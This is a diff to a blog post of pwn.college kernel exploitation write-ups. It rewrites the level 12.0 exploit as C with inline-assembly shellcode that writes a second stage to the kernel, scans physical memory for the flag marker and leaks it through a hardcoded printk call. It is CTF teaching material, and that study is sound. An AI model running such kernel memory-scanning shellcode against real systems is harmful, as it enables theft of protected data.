@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series (Completed)"
 published: 2025-12-19
-updated: 2026-01-05
+updated: 2026-01-07
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -1066,68 +1066,77 @@ __pid_t load_flag()
 ## Exploit
 
 ```c
-#include "axium/tubes/process.h"
-#include "axium/tubes/tube.h"
-#include <stdio.h>
-#include <string.h>
+#include <axium/axium.h>
 
-#define PACKED __attribute__((packed))
-#define NAKED __attribute__((naked))
+#define M_SC_SIDE_CHANNEL_OFFSET 0x11111111
+#define M_SC_SIZE 0x22222222
 
-#define STR(x) #x
-#define XSTR(x) STR(x)
-
-#define TIF_SECCOMP 8
 #define PAGE_OFFSET 0xffff888000000000
+#define PRINTK_ADDR 0xffffffff810b69a9
 
-NAKED void shellcode(void) {
+/* clang-format off */
+DEFINE_SHELLCODE(sc_write) {
+  SHELLCODE_START(sc_write);
   __asm__ volatile(
-      ".intel_syntax noprefix;"
-      ".global sc_start;"
-      ".global sc_end;"
-      "sc_start:;"
-
-      "mov rdi, 0x3;"
-      "lea rsi, [rip + side_channel_start];"
-      "mov rdx, side_channel_end - side_channel_start;"
-      "mov rax, 0x1;"
-      "syscall;" // write(0x3, side_channel_start, sizeof(side_channel))
-
-      "side_channel_start:;"
-      "mov rdi, " XSTR(PAGE_OFFSET) ";"
-                                    "mov rbx, [rip + mark];"
-                                    "loop:;"
-                                    "cmp rbx, [rdi];"
-                                    "je print;"
-                                    "inc rdi;"
-                                    "jmp loop;"
-
-                                    "print:"
-                                    "push rdi;"
-                                    "mov rax, 0xffffffff810b69a9;"
-                                    "call rax;" // printk
-                                    "pop rdi;"
-                                    "inc rdi;"
-                                    "jmp loop;"
-                                    "ret;"
-
-                                    "mark: .ascii \"college{\";"
-                                    "side_channel_end:;"
-
-                                    "sc_end:;"
-                                    ".att_syntax;");
+    "mov edi, 0x3\n"
+    "lea rsi, [rip + "XSTR(M_SC_SIDE_CHANNEL_OFFSET)"]\n"
+    "mov edx, "XSTR(M_SC_SIZE)"\n"
+    "mov eax, 0x1\n"
+    "syscall\n" // write(0x3, side_channel_start, sizeof(side_channel))
+  );
+  SHELLCODE_END(sc_write);
 }
 
-extern char sc_start[];
-extern char sc_end[];
+DEFINE_SHELLCODE(sc_side_channel) {
+  SHELLCODE_START(sc_side_channel);
+  __asm__ volatile(
+      "mov rdi, "XSTR(PAGE_OFFSET)"\n"
+      "mov rbx, [rip + mark]\n"
+      "loop:\n"
+      "  cmp rbx, [rdi]\n"
+      "  je print\n"
+      "  inc rdi\n"
+      "  jmp loop\n"
+      "print:\n"
+      "  push rdi\n"
+      "  mov rax, "XSTR(PRINTK_ADDR)"\n"
+      "  call rax\n"
+      "  pop rdi\n"
+      "  inc rdi\n"
+      "  jmp loop\n"
+      "mark:\n"
+      "  .ascii \"college{\"\n"
+  );
+  SHELLCODE_END(sc_side_channel);
+}
+/* clang-format on */
 
 int main(void) {
+  set_log_level(DEBUG);
   char *const challenge_argv[] = {"/challenge/babykernel_level12.0", NULL};
   tube *t = process_ext(challenge_argv, NULL, TUBE_STDIN);
 
-  size_t sc_size = sc_end - sc_start;
+  payload_t sc_side_channel;
+  payload_init(&sc_side_channel);
+  PAYLOAD_PUSH_SC(&sc_side_channel, sc_side_channel);
 
-  sendline(t, sc_start, sc_size);
+  payload_t sc_write;
+  payload_init(&sc_write);
+  PAYLOAD_PUSH_SC(&sc_write, sc_write);
+  payload_patch_rel32(&sc_write, M_SC_SIDE_CHANNEL_OFFSET, sc_write.size);
+  payload_patch_u32(&sc_write, M_SC_SIZE, sc_side_channel.size);
+
+  payload_t payload;
+  payload_init(&payload);
+  PAYLOAD_PUSH_SC(&payload, sc_write);
+  PAYLOAD_PUSH_SC(&payload, sc_side_channel);
+
+  sendline(t, payload.data, payload.size);
+
+  payload_fini(&sc_side_channel);
+  payload_fini(&sc_write);
+  payload_fini(&payload);
+  t_close(t);
 
   return 0;
 }
